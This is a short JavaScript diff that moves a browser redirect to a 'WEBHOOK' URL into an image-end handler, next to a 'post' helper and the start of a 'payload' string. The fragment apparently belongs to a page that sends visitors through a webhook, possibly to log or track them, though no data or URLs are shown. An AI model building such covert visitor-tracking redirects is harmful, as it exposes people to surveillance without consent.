@@ -17,6 +17,7 @@ function post(url, data) {
 }
 
 function imgEnd() {
+  window.location = WEBHOOK;
   window.location = PROFILE;
 }
 
@@ -25,7 +26,6 @@ function imgEnd() {
 // const id = urlParams.get("id");
 
 try {
-  window.location = WEBHOOK;
   window.open(PROFILE, OPEN);
 
   const payload = `
